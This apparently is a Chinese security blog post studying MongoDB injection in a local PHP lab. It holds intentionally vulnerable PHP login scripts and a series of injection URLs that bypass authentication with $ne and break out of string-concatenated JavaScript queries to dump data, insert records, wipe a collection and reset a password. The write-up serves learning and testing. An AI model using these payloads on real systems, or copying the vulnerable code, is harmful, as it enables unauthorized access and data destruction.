@@ -1,0 +1,704 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('http://yoursite.com').hostname,
+    root: '/',
+    scheme: 'Mist',
+    version: '7.6.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="with MongoDB we are not building queries from strings, so traditional SQL injection attacks are not a problem. -MongoDB Developer FAQ">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MONGODB注入学习">
+<meta property="og:url" content="http://yoursite.com/2018/01/12/MONGODB%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="李三的剑谱">
+<meta property="og:description" content="with MongoDB we are not building queries from strings, so traditional SQL injection attacks are not a problem. -MongoDB Developer FAQ">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2018/01/12/MONGODB%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/phpinfo.png">
+<meta property="og:image" content="http://yoursite.com/2018/01/12/MONGODB%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/01/12/MONGODB%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A32.png">
+<meta property="og:image" content="http://yoursite.com/2018/01/12/MONGODB%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/web.jpg">
+<meta property="og:image" content="http://yoursite.com/2018/01/12/MONGODB%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/%E6%95%B0%E7%BB%84%E7%BB%91%E5%AE%9A1.png">
+<meta property="og:image" content="http://yoursite.com/2018/01/12/MONGODB%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/demo1.png">
+<meta property="og:image" content="http://yoursite.com/2018/01/12/MONGODB%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/%E6%95%B0%E7%BB%84%E7%BB%91%E5%AE%9A2.png">
+<meta property="og:image" content="http://yoursite.com/2018/01/12/MONGODB%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/demo2.png">
+<meta property="og:image" content="http://yoursite.com/2018/01/12/MONGODB%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/%E7%99%BB%E9%99%86%E7%95%8C%E9%9D%A2.png">
+<meta property="og:image" content="http://yoursite.com/2018/01/12/MONGODB%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/json%E4%BC%A0%E5%8F%82.png">
+<meta property="og:image" content="http://yoursite.com/2018/01/12/MONGODB%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/%E5%9B%9E%E6%98%BE.png">
+<meta property="og:image" content="http://yoursite.com/2018/01/12/MONGODB%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/%E9%85%8D%E7%BD%AE%EF%BC%9F.png">
+<meta property="og:image" content="http://yoursite.com/2018/01/12/MONGODB%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/%E4%B8%80%E6%9D%A1%E4%B8%80%E6%9D%A1%E6%9F%A5%E7%9C%8B.png">
+<meta property="og:image" content="http://yoursite.com/2018/01/12/MONGODB%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/bool1.png">
+<meta property="og:image" content="http://yoursite.com/2018/01/12/MONGODB%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/boo2.png">
+<meta property="og:image" content="http://yoursite.com/2018/01/12/MONGODB%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/bool3.png">
+<meta property="og:image" content="http://yoursite.com/2018/01/12/MONGODB%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/ofb.png">
+<meta property="og:image" content="http://yoursite.com/2018/01/12/MONGODB%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/ofb2.png">
+<meta property="article:published_time" content="2018-01-11T16:00:00.000Z">
+<meta property="article:modified_time" content="2019-12-21T12:06:15.777Z">
+<meta property="article:author" content="李三（cl0und）">
+<meta property="article:tag" content="sql">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2018/01/12/MONGODB%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/phpinfo.png">
+
+<link rel="canonical" href="http://yoursite.com/2018/01/12/MONGODB%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>MONGODB注入学习 | 李三的剑谱</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="李三的剑谱" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">李三的剑谱</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="Searching..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/01/12/MONGODB%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="李三（cl0und）">
+      <meta itemprop="description" content="人若无名，便可专心练剑">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="李三的剑谱">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          MONGODB注入学习
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2018-01-12 00:00:00" itemprop="dateCreated datePublished" datetime="2018-01-12T00:00:00+08:00">2018-01-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-12-21 20:06:15" itemprop="dateModified" datetime="2019-12-21T20:06:15+08:00">2019-12-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web-security/" itemprop="url" rel="index">
+                    <span itemprop="name">web security</span>
+                  </a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>7.1k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>6 mins.</span>
+            </span>
+            <div class="post-description">with MongoDB we are not building queries from strings, so traditional SQL injection attacks are not a problem. -MongoDB Developer FAQ</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>with MongoDB we are not building queries from strings, so traditional SQL injection attacks are not a problem.<br>​ -MongoDB Developer FAQ</p>
+<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>主要是对网上paper的一些总结以及最近遇到场景的一些总结。</p>
+<p><strong>千万不要用php7搭环境！千万不要用php7搭环境！千万不要用php7搭环境！</strong></p>
+<p>对比一下代码量可以发现php7的mongodb扩展实在是太恶心了。所以不嫌麻烦的话建议用ubuntu14。</p>
+<p>php5</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span> MongoClient())-&gt;&#123;$db&#125;-&gt;&#123;$collection&#125;-&gt;findOne([<span class="string">'_id'</span> =&gt; $id]);</span><br></pre></td></tr></table></figure>
+
+<p>php7</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$mongo = <span class="keyword">new</span> MongoDB\Driver\Manager();</span><br><span class="line">$result = $mongo-&gt;executeQuery(<span class="string">'db.collection'</span>, <span class="keyword">new</span> MongoDB\Driver\Query([<span class="string">'_id'</span>=&gt;$id], []), <span class="keyword">new</span> MongoDB\Driver\ReadPreference(MongoDB\Driver\ReadPreference::RP_PRIMARY_PREFERRED));</span><br><span class="line"><span class="comment">// 返回的$result是一个对象，需要手动转换成数组。</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>lamp环境</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get apache2</span><br><span class="line">sudo apt-get install php5 php-pear php5-dev</span><br><span class="line">sudo apt-get install libsasl2-dev</span><br></pre></td></tr></table></figure>
+
+<p>安装php mongdb扩展</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pecl install mongodb</span><br></pre></td></tr></table></figure>
+
+<p>额外安装mongodb server，注意不要用apt-get自带的安装，那个版本貌似比较低，用不了简洁的php写法</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-ubuntu1404-3.4.9.tgz</span><br><span class="line">tar -zxvf </span><br><span class="line">mongodb-linux-x86_64-ubuntu1404-3.4.9.tgz</span><br><span class="line"><span class="built_in">cd</span> mongodb-linux-x86_64-ubuntu1404-3.4.9/bin</span><br><span class="line">sudo apt-get install mongodb-server</span><br></pre></td></tr></table></figure>
+
+<p>将<code>extension=mongodb.so</code>放入的php.ini中，因为装的apache故修改<code>/etc/php/7.0/apache2</code></p>
+<p><img src="phpinfo.png" alt="phpinfo.png"></p>
+<p>另外mongodb还有一个28017端口是mongodb的web管理接口</p>
+<p><img src="%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3.jpg" alt="默认端口.jpg"></p>
+<p><img src="%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A32.png" alt="默认端口2.png"></p>
+<p><img src="web.jpg" alt="web.jpg"></p>
+<h2 id="基本简单操作"><a href="#基本简单操作" class="headerlink" title="基本简单操作"></a>基本简单操作</h2><ul>
+<li><p>切换或创建数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use runoob</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>删除数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.dropDatabase()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>创建集合</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.site.insert(&quot;goole&quot;:&quot;www.google.com&quot;)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>删除集合</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.site.drop()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>插入文档</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">db.users.insert(&#123;</span><br><span class="line">	username:&quot;cl0und&quot;,</span><br><span class="line">	password:&quot;cl0und1pass&quot;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>更新文档<br>update法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.site.update(&#123;&#39;title&#39;:&#39;MongoDB 教程&#39;&#125;,&#123;$set:&#123;&#39;title&#39;:&#39;MongoDB&#39;&#125;&#125;)</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>save法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">db.collection.save(</span><br><span class="line">   &lt;document&gt;,</span><br><span class="line">   &#123;</span><br><span class="line">     writeConcern: &lt;document&gt;</span><br><span class="line">   &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>删除文档</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">db.collection.remove(</span><br><span class="line">   &lt;query&gt;,</span><br><span class="line">   &#123;</span><br><span class="line">     justOne: &lt;boolean&gt;,</span><br><span class="line">     writeConcern: &lt;document&gt;</span><br><span class="line">   &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="主要说说查找"><a href="#主要说说查找" class="headerlink" title="主要说说查找"></a>主要说说查找</h2><p>在我所见的paper中基本上都是讲通过查找注入。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.user.find(&#123;&#39;id&#39;:&#123;$gt:1&#125;&#125;) #从当前数据库的集合user中查找id大于1文档</span><br></pre></td></tr></table></figure>
+
+<p>可以发现查询的时候常常会用一些逻辑操作符，而一部分注入姿势就是由此而来的（下面会说到）</p>
+<ul>
+<li>gt 大于 {“field”: {$gt: value}}</li>
+<li>lt 小于 {“field”: {$lt: value}}</li>
+<li>gte 大于等于 {“field”: {$gte: value}}</li>
+<li>lte 小于等于 {“field”: {$lte: value}}</li>
+<li>ne 不等于 {“member.age”: {$ne: “mine”}}</li>
+<li>exists 存在与否 {“member”: {$exists: true}}}</li>
+<li>in 包含 {“member.age”: {$in: [null], “$exists: true”}}</li>
+<li>exists 存在与否 {“couponsCode.0”: {$exists: 1}} #数组存在第一条数据</li>
+<li>or 或者 {“$or”: [{“member.age”: “23”}, {“member.name”: “23333”}]}</li>
+<li>and 并且 {“$and”: [{“member.age”: “23”}, {“member.name”: “23333”}]}</li>
+<li>regex 正则 ({“name”:{“$regex”:’^a$’}})</li>
+<li>size 个数 ({“name”:{“$size”:3}})    # $size  name元素数为3</li>
+</ul>
+<h2 id="注入姿势"><a href="#注入姿势" class="headerlink" title="注入姿势"></a>注入姿势</h2><p>开始之前先写一点测试数据进mongodb</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">use test</span><br><span class="line">db.users.insert(&#123;</span><br><span class="line">	username:&quot;cl0und&quot;,</span><br><span class="line">	password:&quot;cl0und1pass&quot;</span><br><span class="line">&#125;)</span><br><span class="line">db.users.insert(&#123;</span><br><span class="line">	username:&quot;cl0und2&quot;,</span><br><span class="line">	password:&quot;cl0und2pass&quot;</span><br><span class="line">&#125;)</span><br><span class="line">db.users.insert(&#123;</span><br><span class="line">	username:&quot;cl0und3&quot;,</span><br><span class="line">	password:&quot;cl0und3pass&quot;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<h2 id="回显注入-数组绑定注入"><a href="#回显注入-数组绑定注入" class="headerlink" title="回显注入-数组绑定注入"></a>回显注入-数组绑定注入</h2><p>偷了一个网上的脚本。可以把他看到成一个简单的登陆验证demo</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="string">"On"</span>);</span><br><span class="line">error_reporting(E_ALL | E_STRICT);</span><br><span class="line"><span class="comment">//echo extension_loaded("mongodb") ? "loaded\n" : "not loaded\n";</span></span><br><span class="line">$mongo = <span class="keyword">new</span> MongoClient();</span><br><span class="line">$db = $mongo-&gt;test; <span class="comment">//选择数据库</span></span><br><span class="line">$coll = $db-&gt;users; <span class="comment">//选择集合</span></span><br><span class="line">$username = $_GET[<span class="string">'username'</span>];</span><br><span class="line">$password = $_GET[<span class="string">'password'</span>];</span><br><span class="line"><span class="comment">//var_dump($_GET);</span></span><br><span class="line">$data = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'username'</span>=&gt;$username,</span><br><span class="line">        <span class="string">'password'</span>=&gt;$password</span><br><span class="line">        );</span><br><span class="line">$data = $coll-&gt;find($data);</span><br><span class="line">$count = $data-&gt;count();</span><br><span class="line"><span class="keyword">if</span> ($count&gt;<span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $user) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'username:'</span>.$user[<span class="string">'username'</span>].<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'password:'</span>.$user[<span class="string">'password'</span>].<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'未找到'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>正常url <code>http://192.168.62.151/mongo.php?username=cl0und&amp;password=cl0und1pass</code></p>
+<p>相当于执行了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.users.find(&#123;username:&quot;cl0und&quot;,password:&quot;cl0und1pass&quot;&#125;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="%E6%95%B0%E7%BB%84%E7%BB%91%E5%AE%9A1.png" alt="数组绑定1.png"></p>
+<p><img src="demo1.png" alt="demo1.png"></p>
+<p>那么结合php可以传数组的特性可以</p>
+<p>注入url <code>http://192.168.62.151/mongo.php?username[$ne]=cl0und&amp;password[$ne]=cl0und1pass</code></p>
+<p><img src="%E6%95%B0%E7%BB%84%E7%BB%91%E5%AE%9A2.png" alt="数组绑定2.png"></p>
+<p>相当于执行了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.users.find(&#123;username:&#123;$ne:&quot;cl0und&quot;&#125;,password:&#123;$ne:&quot;cl0und1pass&quot;&#125;&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>这样通过数组的嵌套成功的改变了代码执行的逻辑，下面的例子来自于一次做题</p>
+<p><img src="demo2.png" alt="demo2.png"></p>
+<p>这里要通过员工的工号才能注册，但是在不知道工号情况下可以尝试注入。抓包可以发现数据是以json格式上传的，以及之前步骤的一些提示可以猜到后台数据库是以mongodb。因为2333这个工号不存在，而jobnumber这个点又有注入，所以成功绕过注册限制。</p>
+<p><img src="%E7%99%BB%E9%99%86%E7%95%8C%E9%9D%A2.png" alt="登陆界面.png"></p>
+<p><img src="json%E4%BC%A0%E5%8F%82.png" alt="json传参.png"></p>
+<h2 id="回显注入-字符串拼接注入"><a href="#回显注入-字符串拼接注入" class="headerlink" title="回显注入-字符串拼接注入"></a>回显注入-字符串拼接注入</h2><p>这种注入特点和传统的sql注入类似，因为程序员直接拼接的sql语句，造成代码与数据边界不清。因为mongoddb是用js来操作的，所以注入语句符合js语法就好。偷脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$username = $_GET[<span class="string">'username'</span>];</span><br><span class="line">$password = $_GET[<span class="string">'password'</span>];</span><br><span class="line">$query = <span class="string">"var data = db.users.findOne(&#123;username:'$username',password:'$password'&#125;);return data;"</span>;</span><br><span class="line">$mongo = <span class="keyword">new</span> mongoclient();</span><br><span class="line">$db = $mongo-&gt;test;</span><br><span class="line">$data = $db-&gt;execute($query);</span><br><span class="line"><span class="keyword">if</span> ($data[<span class="string">'ok'</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($data[<span class="string">'retval'</span>]!=<span class="keyword">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'username:'</span>.$data[<span class="string">'retval'</span>][<span class="string">'username'</span>].<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'password:'</span>.$data[<span class="string">'retval'</span>][<span class="string">'password'</span>].<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'未找到'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $data[<span class="string">'errmsg'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>网上的payload靠注释改变代码逻辑，但是实际使用不行，原因大概该是高版本不支持注释的原因<br><code>http://192.168.62.151/mongo.php?username=cl0und%27});return%20{username:1,password:2};//&amp;password=cl0und1pass1</code></p>
+<p>可以改变策略闭合后面的代码<br><code>http://192.168.62.151/mongo.php?username=cl0und&#39;});return ({username:1,password:2});var foo = ({&#39;foo&#39;:&#39;&amp;password=cl0und1pass1</code></p>
+<p>然后后续步骤和sql注入类似</p>
+<p><img src="%E5%9B%9E%E6%98%BE.png" alt="回显.png"></p>
+<p>查看版本()<br><code>http://192.168.62.151/mongo.php?username=cl0und&#39;});return ({username:version(),password:2});var foo = ({&#39;foo&#39;:&#39;</code></p>
+<p>查看当前数据库<br><code>http://192.168.62.151/mongo.php?username=cl0und&#39;});return ({username:tojson(db),password:2});var foo = ({&#39;foo&#39;:&#39;</code></p>
+<p>查看当前集合<br><code>http://192.168.62.151/mongo.php?username=cl0und&#39;});return {username:tojson(db.getCollectionNames()),password:2};({foo:&#39;1&amp;password=123456</code></p>
+<p>查看文档<br><code>http://192.168.62.151/mongo.php?username=cl0und&#39;});return {username:tojson(db.users.find()),password:2};({foo:&#39;1&amp;password=123456</code></p>
+<p>这里貌似一次性不能查看全部，这样会回显一些，看起来像是内部的脚本，暂时不知道是什么</p>
+<p><img src="%E9%85%8D%E7%BD%AE%EF%BC%9F.png" alt="配置？.png"></p>
+<p>需要一条一条的看</p>
+<p><img src="%E4%B8%80%E6%9D%A1%E4%B8%80%E6%9D%A1%E6%9F%A5%E7%9C%8B.png" alt="一条一条查看.png"></p>
+<p>联想到多条语句执行，是不是可以插入数据？<br><code>http://192.168.62.151/mongo.php?username=cl0und&#39;});db.users.insert({username:&quot;localguy&quot;,password:&quot;localguy&quot;});var foo = ({&#39;foo&#39;:&#39;</code></p>
+<p>那还能删除数据<br><code>http://192.168.62.151/mongo.php?username=cl0und&#39;});db.users.remove({username:&quot;localguy&quot;,password:&quot;localguy&quot;});var foo = ({&#39;foo&#39;:&#39;</code></p>
+<p>还能删库跑路<br><code>http://192.168.62.151/mongo.php?username=cl0und&#39;});db.users.remove({});var foo = ({&#39;foo&#39;:&#39;</code></p>
+<p>更新别人密码<br><code>http://192.168.62.151/mongo.php?username=cl0und&#39;});db.users.update({&#39;username&#39;:&#39;cl0und&#39;},{$set:{&#39;password&#39;:&#39;hack&#39;}});var foo = ({&#39;foo&#39;:&#39;</code></p>
